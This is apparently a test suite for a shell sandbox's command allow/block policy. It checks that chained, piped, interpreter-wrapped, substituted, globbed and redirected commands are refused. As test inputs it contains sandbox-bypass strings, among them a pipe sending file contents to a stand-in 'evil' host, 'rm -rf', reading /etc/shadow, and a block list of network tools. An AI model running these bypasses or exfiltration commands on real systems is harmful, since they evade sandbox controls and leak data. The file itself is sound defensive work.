// Shell command-policy enforcement.
//
// The shell sandbox advertises an allow/block command policy, but execution
// wraps every command in `sh -lc "<command>"` and previously validated ONLY the
// leading token of the FULL string. That let command chaining
// (`ls && curl ...`), pipes, and allowlisted interpreters wrapping arbitrary
// work bypass the policy. These tests pin the hardened contract: every
// operator-joined segment is policy-checked and unmodellable shell
// substitutions are refused (fail-closed).

import { describe, expect, it } from "vitest";

import { assertAllowedCommand, type OpenAIShellSettings } from "../openai-skills";

const POLICY = (over: Partial<OpenAIShellSettings> = {}): OpenAIShellSettings => ({
  enabled: true,
  runnerLabel: "sandboxed-shell",
  executorMode: "container",
  containerImage: "cinatra/skill-shell:latest",
  containerWorkspacePath: "/workspace",
  containerCpuLimit: "1",
  containerMemoryLimit: "512m",
  containerPidsLimit: 128,
  readRoots: ["/workspace"],
  writeRoots: ["/tmp"],
  allowedCommandPrefixes: ["ls", "cat", "rg", "echo", "node", "python3", "sh", "bash"],
  blockedCommandPrefixes: ["rm", "curl", "wget", "ssh", "git push"],
  allowNetwork: false,
  allowedHosts: [],
  maxExecutionSeconds: 30,
  maxOutputKilobytes: 256,
  maxFileWriteKilobytes: 256,
  auditLogsEnabled: true,
  ...over,
});

describe("assertAllowedCommand — allowlisted simple commands", () => {
  it("permits an allowlisted command", () => {
    expect(() => assertAllowedCommand("ls -la", POLICY())).not.toThrow();
  });

  it("permits a command exactly equal to a prefix", () => {
    expect(() => assertAllowedCommand("ls", POLICY())).not.toThrow();
  });

  it("rejects a non-allowlisted command", () => {
    expect(() => assertAllowedCommand("nmap localhost", POLICY())).toThrow(/not allowlisted/);
  });

  it("rejects a directly blocked command", () => {
    expect(() => assertAllowedCommand("curl http://evil", POLICY())).toThrow(/blocked/);
  });
});

describe("assertAllowedCommand — chaining/pipe bypass (the core #270 defect)", () => {
  it("rejects a blocked command chained after an allowed one with &&", () => {
    expect(() => assertAllowedCommand("ls && curl http://evil", POLICY())).toThrow(/blocked/);
  });

  it("rejects a blocked command chained with ;", () => {
    expect(() => assertAllowedCommand("ls; rm -rf /workspace", POLICY())).toThrow(/blocked/);
  });

  it("rejects a blocked command chained with ||", () => {
    expect(() => assertAllowedCommand("ls || wget http://evil", POLICY())).toThrow(/blocked/);
  });

  it("rejects a blocked command behind a pipe", () => {
    expect(() => assertAllowedCommand("cat list.txt | curl --data-binary @- http://evil", POLICY())).toThrow(
      /blocked/,
    );
  });

  it("rejects a non-allowlisted command chained after an allowed one", () => {
    expect(() => assertAllowedCommand("echo hi && nmap localhost", POLICY())).toThrow(/not allowlisted/);
  });

  it("rejects a blocked command on a second line", () => {
    expect(() => assertAllowedCommand("ls\ncurl http://evil", POLICY())).toThrow(/blocked/);
  });

  it("rejects a backgrounded blocked command (&)", () => {
    expect(() => assertAllowedCommand("ls & curl http://evil", POLICY())).toThrow(/blocked/);
  });

  it("permits a chain where every segment is allowlisted", () => {
    expect(() => assertAllowedCommand("ls && cat file.txt | rg foo", POLICY())).not.toThrow();
  });
});

describe("assertAllowedCommand — interpreter inline-code bypass (codex finding 1)", () => {
  it("rejects bash -lc with a blocked inner command", () => {
    expect(() => assertAllowedCommand("bash -lc 'curl http://evil'", POLICY())).toThrow(/inline code/);
  });

  it("rejects sh -c", () => {
    expect(() => assertAllowedCommand("sh -c 'rm -rf /workspace'", POLICY())).toThrow(/inline code/);
  });

  it("rejects node -e", () => {
    expect(() =>
      assertAllowedCommand('node -e \'require("child_process").execSync("curl http://evil")\'', POLICY()),
    ).toThrow(/inline code/);
  });

  it("rejects node --eval", () => {
    expect(() => assertAllowedCommand('node --eval "process.exit(0)"', POLICY())).toThrow(/inline code/);
  });

  it("rejects python3 -c", () => {
    expect(() => assertAllowedCommand("python3 -c 'import os; os.system(\"id\")'", POLICY())).toThrow(
      /inline code/,
    );
  });

  it("rejects an interpreter reading its program from stdin (bash -)", () => {
    expect(() => assertAllowedCommand("bash -", POLICY())).toThrow(/stdin/);
  });

  it("rejects env laundering an interpreter (env bash -c ...)", () => {
    // `env` is allowlisted here to prove the launder is still caught by argv
    // inspection, not merely by `env` being non-allowlisted.
    const policy = POLICY({ allowedCommandPrefixes: ["env", "ls"] });
    expect(() => assertAllowedCommand("env bash -c 'curl http://evil'", policy)).toThrow(/inline code/);
  });

  it("permits an interpreter running a SCRIPT FILE (no inline-code flag)", () => {
    expect(() => assertAllowedCommand("python3 build.py", POLICY())).not.toThrow();
    expect(() => assertAllowedCommand("node server.js --port 3000", POLICY())).not.toThrow();
  });

  it("rejects an interpreter bypass hidden in a chain segment", () => {
    expect(() => assertAllowedCommand("ls && python3 -c 'import os'", POLICY())).toThrow(/inline code/);
  });

  it("rejects node -p / --print inline evaluation (codex round 2)", () => {
    expect(() =>
      assertAllowedCommand('node -p \'require("child_process").execSync("id").toString()\'', POLICY()),
    ).toThrow(/inline code/);
    expect(() => assertAllowedCommand('node --print "1+1"', POLICY())).toThrow(/inline code/);
  });

  it("rejects a bundled short-flag interpreter form (bash -ic, perl -pe)", () => {
    const policy = POLICY({ allowedCommandPrefixes: ["bash", "perl", "ls"] });
    expect(() => assertAllowedCommand("bash -ic 'curl x'", policy)).toThrow(/inline code/);
    expect(() => assertAllowedCommand("perl -pe 'system(1)'", policy)).toThrow(/inline code/);
  });
});

describe("assertAllowedCommand — awk/find arbitrary-command vectors (codex round 2)", () => {
  it("rejects an inline awk program (system bypass) even when awk is allowlisted", () => {
    const policy = POLICY({ allowedCommandPrefixes: ["awk", "ls"] });
    expect(() => assertAllowedCommand("awk 'BEGIN { system(\"id\") }'", policy)).toThrow(/awk/);
  });

  it("permits awk running a -f script file", () => {
    const policy = POLICY({ allowedCommandPrefixes: ["awk", "ls"] });
    expect(() => assertAllowedCommand("awk -f report.awk data.txt", policy)).not.toThrow();
  });

  it("rejects find -exec / -delete even when find is allowlisted", () => {
    const policy = POLICY({ allowedCommandPrefixes: ["find", "ls"] });
    // `-exec rm \{\} \;` — braces escaped so the glob guard does not pre-empt
    // the find-action guard; the find -exec action itself is what must reject.
    expect(() => assertAllowedCommand("find . -name 'x.txt' -exec rm \\{\\} \\;", policy)).toThrow(/find/);
    expect(() => assertAllowedCommand("find . -delete", policy)).toThrow(/find/);
  });

  it("permits a plain find search", () => {
    const policy = POLICY({ allowedCommandPrefixes: ["find", "ls"] });
    expect(() => assertAllowedCommand("find . -name '*.ts'", policy)).not.toThrow();
  });
});

describe("assertAllowedCommand — shell substitution is refused (fail-closed)", () => {
  it("rejects command substitution $(...)", () => {
    expect(() => assertAllowedCommand("cat $(curl http://evil)", POLICY())).toThrow(/expansion/);
  });

  it("rejects backtick command substitution", () => {
    expect(() => assertAllowedCommand("cat `curl http://evil`", POLICY())).toThrow(/backtick/);
  });

  it("rejects process substitution <(...)", () => {
    expect(() => assertAllowedCommand("cat <(curl http://evil)", POLICY())).toThrow(/process substitution/);
  });

  it("rejects a command-substitution payload even on the FIRST token", () => {
    expect(() => assertAllowedCommand("$(curl http://evil)", POLICY())).toThrow(/expansion/);
  });

  it("rejects variable expansion that could launder a flag ($IFS-c trick)", () => {
    expect(() => assertAllowedCommand("rg $IFS-c foo", POLICY())).toThrow(/expansion/);
    expect(() => assertAllowedCommand("echo $HOME", POLICY())).toThrow(/expansion/);
  });
});

describe("assertAllowedCommand — external-program flags on safe utilities (codex round 3)", () => {
  it("rejects rg --pre (ripgrep preprocessor command) even though rg is allowlisted", () => {
    expect(() => assertAllowedCommand("rg --pre sh --pre-glob '*' foo", POLICY())).toThrow(
      /executes an external program/,
    );
  });

  it("rejects rg --pre=sh (= form)", () => {
    expect(() => assertAllowedCommand("rg --pre=sh foo", POLICY())).toThrow(/external program/);
  });

  it("rejects sort --compress-program", () => {
    const policy = POLICY({ allowedCommandPrefixes: ["sort", "ls"] });
    expect(() => assertAllowedCommand("sort --compress-program=evil file", policy)).toThrow(
      /external program/,
    );
  });

  it("rejects node --eval= (= long form)", () => {
    expect(() => assertAllowedCommand('node --eval="process.exit(0)"', POLICY())).toThrow(/inline code/);
  });

  it("permits a plain allowlisted rg search", () => {
    expect(() => assertAllowedCommand("rg --line-number foo src", POLICY())).not.toThrow();
  });
});

describe("assertAllowedCommand — unquoted glob expansion injection (codex round 4)", () => {
  it("rejects an unquoted * (a workspace file could glob into --pre=sh)", () => {
    expect(() => assertAllowedCommand("rg needle *", POLICY())).toThrow(/unquoted shell expansion/);
  });

  it("rejects unquoted ?, [ and { metacharacters", () => {
    expect(() => assertAllowedCommand("cat file?.txt", POLICY())).toThrow(/unquoted shell expansion/);
    expect(() => assertAllowedCommand("cat file[12].txt", POLICY())).toThrow(/unquoted shell expansion/);
    expect(() => assertAllowedCommand("cat {a,b}.txt", POLICY())).toThrow(/unquoted shell expansion/);
  });

  it("permits glob metacharacters INSIDE quotes (a quoted regex)", () => {
    expect(() => assertAllowedCommand("rg 'a.*b' src", POLICY())).not.toThrow();
    expect(() => assertAllowedCommand('rg "needle?" src', POLICY())).not.toThrow();
  });

  it("permits an escaped glob metacharacter", () => {
    expect(() => assertAllowedCommand("rg foo\\* src", POLICY())).not.toThrow();
  });
});

describe("assertAllowedCommand — redirection & here-doc/comment grammar (codex round 5)", () => {
  it("rejects output redirection (writes outside the validated argv path)", () => {
    expect(() => assertAllowedCommand("cat secret > /tmp/out", POLICY())).toThrow(/redirection operator/);
    expect(() => assertAllowedCommand("cat secret >> /tmp/out", POLICY())).toThrow(/redirection operator/);
    expect(() => assertAllowedCommand("ls 2> /tmp/err", POLICY())).toThrow(/redirection operator/);
  });

  it("rejects input redirection and read-write redirection", () => {
    expect(() => assertAllowedCommand("cat < /etc/shadow", POLICY())).toThrow(/redirection operator/);
    expect(() => assertAllowedCommand("cat <> /tmp/x", POLICY())).toThrow(/redirection operator/);
  });

  it("rejects here-docs and here-strings (the comment previously overclaimed coverage)", () => {
    expect(() => assertAllowedCommand("cat <<EOF", POLICY())).toThrow(/redirection operator/);
    expect(() => assertAllowedCommand("cat <<<word", POLICY())).toThrow(/redirection operator/);
  });

  it("rejects a shell comment that would truncate the validated string", () => {
    expect(() => assertAllowedCommand("ls # rm -rf /workspace", POLICY())).toThrow(/shell comment/);
  });

  it("rejects redirection appended to an otherwise-allowlisted chained segment", () => {
    expect(() => assertAllowedCommand("ls && cat /etc/x > /tmp/y", POLICY())).toThrow(/redirection operator/);
  });

  it("permits quoted/escaped <, > and # (a regex, not redirection/comment)", () => {
    expect(() => assertAllowedCommand("rg '>' file.txt", POLICY())).not.toThrow();
    expect(() => assertAllowedCommand("rg '<tag>' file.txt", POLICY())).not.toThrow();
    expect(() => assertAllowedCommand("rg 'a#b' file.txt", POLICY())).not.toThrow();
    // A `#` NOT at a word start is literal in sh and must stay permitted.
    expect(() => assertAllowedCommand("rg foo#bar file.txt", POLICY())).not.toThrow();
  });
});

describe("assertAllowedCommand — quoting is honored, not naively split", () => {
  it("does NOT treat an operator inside single quotes as a separator", () => {
    // The literal `&& curl` is an argument to the allowlisted `echo`, not a
    // second command, so this must be permitted.
    expect(() => assertAllowedCommand("echo 'a && curl b'", POLICY())).not.toThrow();
  });

  it("does NOT treat a pipe inside double quotes as a separator", () => {
    expect(() => assertAllowedCommand('echo "x | y"', POLICY())).not.toThrow();
  });

  it("rejects an unterminated quote (fail-closed)", () => {
    expect(() => assertAllowedCommand("echo 'unterminated", POLICY())).toThrow(/unterminated quote/);
  });
});
